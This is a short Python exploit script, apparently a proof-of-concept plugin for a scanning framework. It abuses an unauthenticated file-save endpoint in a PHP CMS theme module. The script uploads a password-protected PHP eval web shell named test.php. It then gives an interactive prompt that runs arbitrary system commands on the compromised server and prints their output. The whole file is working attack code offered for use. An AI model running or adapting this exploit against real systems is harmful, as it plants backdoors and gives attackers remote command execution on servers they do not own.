from lib.core.data import target
import urlparse
import requests
import re

def poc():
	try:
		if  not target.url.endswith("dapur/apps/app_theme/libs/save_file.php"):
			print("[*] Please make sure the url end with 'dapur/apps/app_theme/libs/save_file.php'")
			exit()

		password = raw_input("[*] Please enter the shell-password:")
		phpShell = "<?php eval($_POST['" + password + "']);?>"
		shellName = "test.php"
		postdata = {
			'content': phpShell,
			'src':	shellName
		}
		r = requests.post(target.url, data=postdata)

		shell = target.url.replace("save_file.php",shellName)

		while 1:
			try:
				command = raw_input("[*] input the command:")
				payload= 'system("%s");' % command
				if command != "exit":
					postdata = {
						password : payload
					}
					r = requests.post(shell, data=postdata)
					print(r.text.encode(r.encoding))
				else:
					break
			except EOFError as e:
				print("[*] type 'exit' to quit")
				pass

		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
	except KeyError as e:
		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
